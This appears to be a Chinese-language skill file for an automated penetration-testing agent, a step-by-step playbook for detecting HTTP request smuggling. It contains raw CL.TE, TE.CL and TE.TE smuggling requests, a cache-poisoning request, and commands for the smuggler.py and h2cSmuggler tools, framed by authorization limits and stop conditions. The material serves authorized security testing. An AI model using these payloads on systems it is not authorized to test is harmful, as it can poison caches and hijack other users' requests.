---
name: http-request-smuggling
description: 检测 HTTP 请求走私漏洞，利用前端和后端服务器对 HTTP 请求边界解析不一致实现缓存投毒、请求劫持和绕过安全控制。
category: web
source: xalgorix
tags:
  - HTTP 请求走私
  - 缓存投毒
  - 前端/后端不一致
  - CL.TE
  - TE.CL
required_tools:
  - curl
  - Burp Suite HTTP Request Smuggler 插件 或 smuggler.py
---

# HTTP 请求走私

## 适用场景

- 目标部署了反向代理、CDN 或负载均衡器（前端）转发请求到后端。
- 前端和后端对 `Content-Length` (CL) 和 `Transfer-Encoding` (TE) 头的解析方式不同。
- 需要测试缓存投毒、请求劫持和 WAF 绕过。

## 授权边界

- **请求走私可能影响其他用户到达后端的请求，属于高风险测试。**
- 使用非持久化方法（Timing 技术）检测，避免影响真实用户。
- 如确认可利用，仅在 scope 明确允许时进行缓存投毒测试，且使用唯一标记避免影响生产流量。

## 前置条件

- 目标使用 HTTP/1.1（HTTP/2 有不同攻击方法）。
- 能够发送原始 HTTP 请求（Burp Repeater 或 `printf` + `nc`）。
- 了解 CL.TE、TE.CL、TE.TE 三种基本走私类型。

## 执行步骤

### 步骤 1：确定走私类型

**CL.TE 检测**（前端用 Content-Length，后端用 Transfer-Encoding）：

```http
POST / HTTP/1.1
Host: <target>
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

如响应超时，说明后端在等待 chunk `G` 的后续数据 → CL.TE 走私可行。

**TE.CL 检测**（前端用 Transfer-Encoding，后端用 Content-Length）：

```http
POST / HTTP/1.1
Host: <target>
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Host: <target>
Content-Length: 15

x=1
0

```

如第二个请求收到 404 响应，说明 TE.CL 走私可行。

### 步骤 2：TE.TE 检测

```http
POST / HTTP/1.1
Host: <target>
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: cow

5c
POST /404 HTTP/1.1
Host: <target>
Content-Length: 15

x=1
0

```

观察前端和后端对混淆 TE 头的不同处理。

### 步骤 3：确认可利用性

```bash
# 使用 smuggler.py 自动化检测
python3 smuggler.py -u https://<target> -m all
```

### 步骤 4：缓存投毒（如确认走私）

```http
POST / HTTP/1.1
Host: <target>
Content-Length: <calculated>
Transfer-Encoding: chunked

0

GET /static/js/app.js HTTP/1.1
Host: <target>
X-Poison: <unique_marker>


```

然后访问 `/static/js/app.js`，检查响应是否包含 `X-Poison` 头。

### 步骤 5：HTTP/2 降级走私

如果目标支持 HTTP/2 → HTTP/1.1 降级：

```bash
# 使用 h2cSmuggler 测试
python3 h2cSmuggler.py -u https://<target> --test
```

## 停止条件

- 利用走私影响其他用户请求时，立即停止（如观察到其他人的响应出现在自己的响应中）。
- 缓存投毒测试仅使用唯一标记，不投毒关键资源（如首页、登录页）。
- 如果目标 CDN 提供商（Cloudflare、Akamai 等）已声明防范走私，记录结论即可。

## 输出格式

- 走私类型（CL.TE / TE.CL / TE.TE / H2.CL）。
- 检测方法（Timing / 404 回显 / 缓存投毒）。
- 可走私到的后端路由。
- 缓存投毒影响范围（如有）。

## 验收标准

1. 测试了至少 3 种走私类型（CL.TE、TE.CL、TE.TE）。
2. 如目标支持 HTTP/2，进行了降级走私测试。
3. 未进行破坏性缓存投毒。
4. 发现即记录，不持续利用。
